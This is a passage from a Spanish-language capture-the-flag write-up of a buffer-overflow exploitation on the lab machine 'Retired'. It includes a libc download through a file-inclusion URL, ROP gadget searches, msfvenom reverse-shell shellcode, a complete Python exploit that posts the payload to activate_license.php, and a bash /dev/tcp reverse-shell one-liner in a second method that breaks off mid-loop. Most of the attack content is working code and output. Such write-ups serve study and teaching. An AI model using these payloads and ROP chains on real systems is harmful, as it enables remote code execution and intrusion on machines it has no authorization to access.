<p class="plain-text">La tecnica que utilzaremos será usar <code class="language-plaintext highlighter-rouge">mprotect</code> para modificar los permisos de la <code class="language-plaintext highlighter-rouge">pila</code> y hacerla <code class="language-plaintext highlighter-rouge">ejecutable</code>, para despues poder ejecutar ahi nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, en el <a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">manual</a> de mprotect podemos ver que esta función recibe 3 <code class="language-plaintext highlighter-rouge">argumentos</code>, el primer argumento es la dirección a la que queremos cambiarle los privilegios, esta será el stack, la segunda el tamaño del stack y la ultima el permiso donde <code class="language-plaintext highlighter-rouge">7</code> es igual a <code class="language-plaintext highlighter-rouge">rwx</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int </span><span class="na">mprotect</span><span class="p">(</span><span class="no">void </span><span class="o">*</span><span class="am">addr</span><span class="p">, </span><span class="na">size_t </span><span class="am">len</span><span class="p">, </span><span class="no">int </span><span class="am">prot</span><span class="p">);  </span>
</code></pre></div></div><br>

<p class="plain-text">En el archivo <code class="language-plaintext highlighter-rouge">maps</code> podemos ver las <code class="language-plaintext highlighter-rouge">direcciones</code> desde donde inicia hasta donde termina el <code class="language-plaintext highlighter-rouge">stack</code>, con ello obtenemos el primer argumento, para el segundo que es el <code class="language-plaintext highlighter-rouge">tamaño</code> podemos calculardo restandole la direccion de inicio a la de final</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">stack_start </span><span class="o">= </span><span class="mi">0x7ffe3ea7d000
</span><span class="p">stack_end </span><span class="o">= </span><span class="mi">0x7ffe3ea9e000
</span><span class="p">stack_size</span><span class="o"> = </span><span class="p">stack_end </span><span class="o">- </span><span class="p">stack_start</span>
</code></pre></div></div><br>

<p class="plain-text">Además en el archivo <code class="language-plaintext highlighter-rouge">maps</code> podemos tomar la dirección donde inicia <code class="language-plaintext highlighter-rouge">libc</code> en el proceso para tomarlo como <code class="language-plaintext highlighter-rouge">libc_base</code> para algunas operaciones mas adelante</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">libc_base</span><span class="o"> = </span><span class="mi">0x7f670e288000</span>
</code></pre></div></div><br>

<p class="plain-text">Para poder obtener los ofssets descargaremos el archivo <code class="language-plaintext highlighter-rouge">libc</code> de la máquina</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://10.10.11.154/?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so"</span><span class="p"> -o libc-2.31.so  </span>
</code></pre></div></div><br>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">readelf</code> podemos obtener un <code class="language-plaintext highlighter-rouge">offset</code> de la función <code class="language-plaintext highlighter-rouge">mprotect</code> que al sumarlo con la dirección de <code class="language-plaintext highlighter-rouge">libc_base</code> nos daria como resultado la <code class="language-plaintext highlighter-rouge">dirección</code> de la función</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ readelf </span><span class="p">-s libc-2.31.so | </span><span class="ve">grep </span><span class="p">mprotect@@
  1225: 00000000000f8c20    33 FUNC    WEAK   DEFAULT   14 </span><span class="ro">mprotect@@</span><span class="p">GLIBC_2.2.5  </span>
</code></pre></div></div><br>

<p class="plain-text">Tenemos los 3 argumentos para <code class="language-plaintext highlighter-rouge">mprotect</code> pero para que la función los tome es necesario tener el control de los registros <code class="language-plaintext highlighter-rouge">rdi</code>, <code class="language-plaintext highlighter-rouge">rsi</code> y <code class="language-plaintext highlighter-rouge">rdx</code> para poder enviarlos ahi y llamarla, para ello con <code class="language-plaintext highlighter-rouge">ropper</code> buscaremos <code class="language-plaintext highlighter-rouge">gadgets</code> que hagan un pop a ellos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --console
</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
</span><span class="ro">(libc-2.31.so/ELF/x86_64)> </span><span class="p">search pop rdi; ret;  
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rdi; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: libc-2.31.so
</span><span class="ro">0x0000000000026796</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rdi</span><span class="az">; </span><span class="am">ret</span><span class="az">;

</span><span class="ro">(libc-2.31.so/ELF/x86_64)></span><span class="p"> search pop rsi; ret;  
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rsi; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: libc-2.31.so
</span><span class="ro">0x000000000002890f</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rsi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;

</span><span class="ro">(libc-2.31.so/ELF/x86_64)> </span><span class="p">search pop rdx; ret;  
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rdx; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: libc-2.31.so
</span><span class="ro">0x00000000000cb1cd</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rdx</span><span class="az">;</span><span class="am"> ret</span><span class="az">;

</span><span class="ro">(libc-2.31.so/ELF/x86_64)></span>
</code></pre></div></div><br>

<p class="plain-text">La idea ahora seria despues de llamar a <code class="language-plaintext highlighter-rouge">mprotect</code> hacer un salto al registro <code class="language-plaintext highlighter-rouge">rsp</code> que es la pila y ahora que ésta es ejecutable ejecutar ahi nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, aunque no encontramos un <code class="language-plaintext highlighter-rouge">jmp rsp</code> si encontramos instrucciones equivalentes como <code class="language-plaintext highlighter-rouge">call esp</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">(libc-2.31.so/ELF/x86_64)> </span><span class="p">jmp rsp   

JMP Instructions
================

</span><span class="ro">0x0000000000027a5e</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x00000000000307bc</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x000000000003afc9</span><span class="p">: </span><span class="am">push </span><span class="p">rsp</span><span class="az">; </span><span class="am">ret</span><span class="az">;
</span><span class="ro">0x000000000004cf33</span><span class="p">: </span><span class="am">push </span><span class="p">rsp</span><span class="az">; </span><span class="am">ret</span><span class="az">;
</span><span class="ro">0x000000000004d4b3</span><span class="p">: </span><span class="am">push </span><span class="p">rsp</span><span class="az">; </span><span class="am">ret</span><span class="az">;
</span><span class="ro">0x000000000007c2ca</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x00000000000c6f67</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x00000000000c740b</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x00000000000e750a</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x00000000000e75e7</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x00000000000e7e9e</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x00000000000f9c9a</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x00000000000f9cb2</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x00000000000f9d2a</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x00000000000f9d42</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x00000000000fa131</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x00000000000fdc2e</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x0000000000106251</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x000000000012020e</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x0000000000120421</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x0000000000137d99</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="ro">0x000000000016e7b7</span><span class="p">: </span><span class="am">call </span><span class="p">rsp</span><span class="az">;
</span><span class="p">
22 gadgets found
</span><span class="ro">
(libc-2.31.so/ELF/x86_64)></span>
</code></pre></div></div><br>

<p class="plain-text">Ya en el <code class="language-plaintext highlighter-rouge">rsp</code> podemos ejecutar nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, en este caso generamos uno con <code class="language-plaintext highlighter-rouge">msfvenom</code> que nos envie una <code class="language-plaintext highlighter-rouge">reverse shell</code>, esto indicando el formato <code class="language-plaintext highlighter-rouge">python</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f python -v shellcode  
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 432 bytes
shellcode =  b""
shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
shellcode += b"\x05\x48\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0a"
shellcode += b"\x0e\x0a\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a"
shellcode += b"\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21"
shellcode += b"\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb"
shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
shellcode += b"\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora simplemente lo definimos en el <code class="language-plaintext highlighter-rouge">script</code> de python para poder usarlo despues</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">shellcode </span><span class="o">=</span><span class="no">  b</span><span class="s">""</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x05\x48\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0e\x9b\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestra cadena <code class="language-plaintext highlighter-rouge">rop</code> establecerá los argumentos para <code class="language-plaintext highlighter-rouge">mprotect</code> con el fin de que al llamarlo modifique los privilegios del stack a <code class="language-plaintext highlighter-rouge">7</code> o <code class="language-plaintext highlighter-rouge">rwx</code> para hacerlo ejecutable, luego con un <code class="language-plaintext highlighter-rouge">call</code> al registro <code class="language-plaintext highlighter-rouge">rsp</code> podremos ejecutar nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> en la pila</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">payload  </span><span class="o">=</span><span class="no"> b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> junk
payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x26796</span><span class="p">)</span><span class="c1"> # pop rdi; ret;</span><span class="p">  
payload</span><span class="o"> +=</span><span class="p"> p64(stack_start)</span><span class="c1">         # addr</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x2890f</span><span class="p">)</span><span class="c1"> # pop rsi; ret;</span><span class="p">  
payload</span><span class="o"> +=</span><span class="p"> p64(stack_size)</span><span class="c1">          # len</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0xcb1cd</span><span class="p">)</span><span class="c1"> # pop rdx; ret;</span><span class="p">  
payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x7</span><span class="p">)</span><span class="c1">                 # prot</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p64(libc_base </span><span class="o">+</span><span class="mi"> 0xf8c20</span><span class="p">)</span><span class="c1"> # mprotect()</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x27a5e</span><span class="p">)</span><span class="c1"> # call rsp;</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> shellcode</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de definir el <code class="language-plaintext highlighter-rouge">payload</code> en el script simplemente mediante una petición <code class="language-plaintext highlighter-rouge">POST</code> enviar el payload como archivo llamado <code class="language-plaintext highlighter-rouge">licensefile</code> a el php de la máquina victima</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">requests.post</span><span class="p">(</span><span class="s">"http://10.10.11.154/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
</code></pre></div></div><br>

<p class="plain-text">El script final para ejecutar el <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> utilizando la función <code class="language-plaintext highlighter-rouge">mprotect</code> para cambiar los permisos de la pila y hacerla <code class="language-plaintext highlighter-rouge">ejecutable</code> quedaria de la siguiente manera</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">p64
</span><span class="o">import </span><span class="p">requests

offset </span><span class="o">= </span><span class="mi">520</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

libc_base</span><span class="o"> = </span><span class="mi">0x7f670e288000</span><span class="p">

stack_start </span><span class="o">= </span><span class="mi">0x7ffe3ea7d000
</span><span class="p">stack_end </span><span class="o">= </span><span class="mi">0x7ffe3ea9e000
</span><span class="p">stack_size</span><span class="o"> = </span><span class="p">stack_end </span><span class="o">- </span><span class="p">stack_start

shellcode </span><span class="o">=</span><span class="no">  b</span><span class="s">""</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x05\x48\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0e\x9b\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span><span class="p">

payload  </span><span class="o">=</span><span class="no"> b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> junk
payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x26796</span><span class="p">)</span><span class="c1"> # pop rdi; ret;</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p64(stack_start)</span><span class="c1">         # addr</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x2890f</span><span class="p">)</span><span class="c1"> # pop rsi; ret;</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p64(stack_size)</span><span class="c1">          # len</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0xcb1cd</span><span class="p">)</span><span class="c1"> # pop rdx; ret;</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x7</span><span class="p">)</span><span class="c1">                 # prot</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p64(libc_base </span><span class="o">+</span><span class="mi"> 0xf8c20</span><span class="p">)</span><span class="c1"> # mprotect()</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x27a5e</span><span class="p">)</span><span class="c1"> # call rsp;</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> shellcode

requests.post</span><span class="p">(</span><span class="s">"http://10.10.11.154/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">script</code> enviara la petición con nuestro payload y al programa interpretarla nos enviara una <code class="language-plaintext highlighter-rouge">revshell</code> en este caso como <code class="language-plaintext highlighter-rouge">www-data</code> a nuestro host</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.154 
script /dev/null -c bash
Script started, output log file is '/dev/null'.
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
10.10.11.154 
</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

</section>

<section class="post" id="bof-writable">
<br><h3 class="post-title">Buffer Overflow - writable</h3><br>

<p class="plain-text">Otro metodo de explotarlo es usando una sección writable, pero antes necesitaremos obtener del <code class="language-plaintext highlighter-rouge">maps</code> para obtener la dirección base de <code class="language-plaintext highlighter-rouge">libc</code> para los gadgets</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">libc_base </span><span class="o">= </span><span class="mi">0x7f670e288000</span>
</code></pre></div></div><br>

<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">rabin2</code> para ver las secciones de <code class="language-plaintext highlighter-rouge">libc</code>, podemos ver una seccion <code class="language-plaintext highlighter-rouge">.data</code> donde tenemos los permisos <code class="language-plaintext highlighter-rouge">rw-</code> osea que podemos escribir en esta</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ rabin2 </span><span class="p">-S libc-2.31.so
[Sections]

nth paddr           size vaddr          vsize perm type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000       0x0 0x00000000       0x0 ---- NULL
1   0x000002e0      0x24 0x000002e0      0x24 -r-- NOTE        .note.gnu.build-id
2   0x00000304      0x20 0x00000304      0x20 -r-- NOTE        .note.ABI-tag
3   0x00000328    0x34f4 0x00000328    0x34f4 -r-- HASH        .hash
4   0x00003820    0x3cb4 0x00003820    0x3cb4 -r-- GNU_HASH    .gnu.hash
5   0x000074d8    0xde30 0x000074d8    0xde30 -r-- DYNSYM      .dynsym
6   0x00015308    0x60c1 0x00015308    0x60c1 -r-- STRTAB      .dynstr
7   0x0001b3ca    0x1284 0x0001b3ca    0x1284 -r-- GNU_VERSYM  .gnu.version
8   0x0001c650     0x470 0x0001c650     0x470 -r-- GNU_VERDEF  .gnu.version_d
9   0x0001cac0      0x30 0x0001cac0      0x30 -r-- GNU_VERNEED .gnu.version_r
10  0x0001caf0    0x7a28 0x0001caf0    0x7a28 -r-- RELA        .rela.dyn
11  0x00024518     0x468 0x00024518     0x468 -r-- RELA        .rela.plt
12  0x00025000     0x300 0x00025000     0x300 -r-x PROGBITS    .plt
13  0x00025300      0x20 0x00025300      0x20 -r-x PROGBITS    .plt.got
14  0x00025320  0x149439 0x00025320  0x149439 -r-x PROGBITS    .text
15  0x0016e760     0xe4c 0x0016e760     0xe4c -r-x PROGBITS    __libc_freeres_fn
16  0x00170000   0x23f18 0x00170000   0x23f18 -r-- PROGBITS    .rodata
17  0x00193f20      0x1c 0x00193f20      0x1c -r-- PROGBITS    .interp
18  0x00193f3c    0x61b4 0x00193f3c    0x61b4 -r-- PROGBITS    .eh_frame_hdr
19  0x0019a0f0   0x1fae8 0x0019a0f0   0x1fae8 -r-- PROGBITS    .eh_frame
20  0x001b9bd8     0x41b 0x001b9bd8     0x41b -r-- PROGBITS    .gcc_except_table
21  0x001ba5e0      0x10 0x001bb5e0      0x10 -rw- PROGBITS    .tdata
22  0x001ba5f0       0x0 0x001bb5f0      0x80 -rw- NOBITS      .tbss
23  0x001ba5f0      0x10 0x001bb5f0      0x10 -rw- INIT_ARRAY  .init_array
24  0x001ba600    0x2580 0x001bb600    0x2580 -rw- PROGBITS    .data.rel.ro
25  0x001bcb80     0x1e0 0x001bdb80     0x1e0 -rw- DYNAMIC     .dynamic
26  0x001bcd60     0x298 0x001bdd60     0x298 -rw- PROGBITS    .got
27  0x001bd000     0x190 0x001be000     0x190 -rw- PROGBITS    .got.plt
28  0x001bd1a0    0x1600 0x001be1a0    0x1600 -rw- PROGBITS    .data
29  0x001be7a0      0xf0 0x001bf7a0      0xf0 -rw- PROGBITS    __libc_subfreeres
30  0x001be8a0     0xd68 0x001bf8a0     0xd68 -rw- PROGBITS    __libc_IO_vtables
31  0x001bf608       0x8 0x001c0608       0x8 -rw- PROGBITS    __libc_atexit
32  0x001bf610       0x0 0x001c0620    0x3d50 -rw- NOBITS      .bss
33  0x001bf610       0x0 0x001c4370     0x198 -rw- NOBITS      __libc_freeres_ptrs  </span>
</code></pre></div></div><br>

<p class="plain-text">Lo que haremos sera ejecutar un comando con <code class="language-plaintext highlighter-rouge">system</code> asi que usando <code class="language-plaintext highlighter-rouge">readelf</code> buscaremos el offset de la funcion system en la libreria <code class="language-plaintext highlighter-rouge">libc</code> que descargamos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ readelf</span><span class="p"> -s libc-2.31.so | </span><span class="ve">grep </span><span class="p">system@@
  1430: 0000000000048e50    45 FUNC    WEAK   DEFAULT   14 </span><span class="ro">system@@</span><span class="p">GLIBC_2.2.5  </span>
</code></pre></div></div><br>

<p class="plain-text">Lo que nos interesa es ejecutar un <code class="language-plaintext highlighter-rouge">oneliner</code> de bash el cual nos envie una reverse <code class="language-plaintext highlighter-rouge">shell</code>, por ahora lo definiremos y despues veremos como inyectarlo en el programa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">command </span><span class="o">= </span><span class="no">b</span><span class="s">"bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestra cadena rop pretende guardar esta cadena en la sección .data para después pasarle esta dirección a system, sin embargo esta cadena solo podemos enviarla en <code class="language-plaintext highlighter-rouge">qwords</code> con un <code class="language-plaintext highlighter-rouge">mov</code> al desreferenciado de un registro, por lo que necesitaremos un gadget tipo <code class="language-plaintext highlighter-rouge">mov [???], ???; ret;</code> y sus respectivos <code class="language-plaintext highlighter-rouge">pops</code> a los registros</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --console
</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
</span><span class="ro">(libc-2.31.so/ELF/x86_64)> </span><span class="p">search mov [rdi], rsi; ret;  
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: mov [rdi], rsi; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: libc-2.31.so
</span><span class="ro">0x00000000000603b2</span><span class="p">:</span><span class="am"> mov</span><span class="p"> qword ptr [rdi], rsi</span><span class="az">; </span><span class="am">ret</span><span class="az">;

</span><span class="ro">(libc-2.31.so/ELF/x86_64)> </span><span class="p">search pop rdi; ret;
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rdi; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: libc-2.31.so
</span><span class="ro">0x0000000000026796</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rdi</span><span class="az">; </span><span class="am">ret</span><span class="az">;

</span><span class="ro">(libc-2.31.so/ELF/x86_64)></span><span class="p"> search pop rsi; ret;
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rsi; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: libc-2.31.so
</span><span class="ro">0x000000000002890f</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rsi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;

</span><span class="ro">(libc-2.31.so/ELF/x86_64)></span>
</code></pre></div></div><br>

<p class="plain-text">Iniciaremos el <code class="language-plaintext highlighter-rouge">payload</code> simplemente <code class="language-plaintext highlighter-rouge">junk</code> hasta antes de sobrescribir el retorno</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""
</span><span class="p">payload </span><span class="o">+= </span><span class="p">junk</span>
</code></pre></div></div><br>

<p class="plain-text">Mediante un bucle <code class="language-plaintext highlighter-rouge">for</code> cargaremos de <code class="language-plaintext highlighter-rouge">8</code> en <code class="language-plaintext highlighter-rouge">8</code> bytes del comando al registro <code class="language-plaintext highlighter-rouge">rsi</code> y guardaremos en <code class="language-plaintext highlighter-rouge">rdi</code> la dirección de <code class="language-plaintext highlighter-rouge">.data</code> con el offset necesario, luego al ejecutar el <code class="language-plaintext highlighter-rouge">mov</code> depositaremos los <code class="language-plaintext highlighter-rouge">8</code> bytes de la cadena en la sección <code class="language-plaintext highlighter-rouge">.data</code> asi que al terminar deberiamos tener todo el comando de bash en la sección <code class="language-plaintext highlighter-rouge">.data</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="no"> len</span><span class="p">(command), </span><span class="mi">8</span><span class="p">):
    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x26796</span><span class="p">)</span><span class="c1">         # pop rdi; ret;</span><span class="p">
    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x1be1a0</span><span class="o"> +</span><span class="p"> i)</span><span class="c1">    # .data</span><span class="p">
    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x2890f</span><span class="p">)</span><span class="c1">         # pop rsi; ret;</span><span class="p">
    payload</span><span class="o"> +=</span><span class="p"> command[i:i</span><span class="o">+</span><span class="mi">8</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">,</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)</span><span class="c1"> # string</span><span class="p">
    payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x603b2</span><span class="p">)</span><span class="c1">         # mov qword ptr [rdi], rsi; ret;  </span><span class="p"></span>
</code></pre></div></div><br>

